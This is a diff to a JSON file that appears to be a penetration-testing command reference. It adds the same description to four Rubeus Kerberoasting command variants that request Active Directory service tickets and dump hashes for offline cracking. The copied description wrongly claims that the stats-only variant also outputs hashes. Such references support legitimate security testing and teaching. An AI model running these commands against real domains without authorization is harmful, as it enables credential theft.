@@ -187,19 +187,23 @@
   "variations": [
     {
       "label": "OPSEC (skip AES accounts)",
-      "command": ".\\Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:hashes.txt"
+      "command": ".\\Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:hashes.txt",
+      "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
     },
     {
       "label": "Use current TGT (no creds)",
-      "command": ".\\Rubeus.exe kerberoast /tgtdeleg /nowrap"
+      "command": ".\\Rubeus.exe kerberoast /tgtdeleg /nowrap",
+      "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
     },
     {
       "label": "Stats only",
-      "command": ".\\Rubeus.exe kerberoast /stats"
+      "command": ".\\Rubeus.exe kerberoast /stats",
+      "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
     },
     {
       "label": "Include AES accounts (mode 19700)",
-      "command": ".\\Rubeus.exe kerberoast /aes /nowrap"
+      "command": ".\\Rubeus.exe kerberoast /aes /nowrap",
+      "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
     }
   ],
   "steps": [
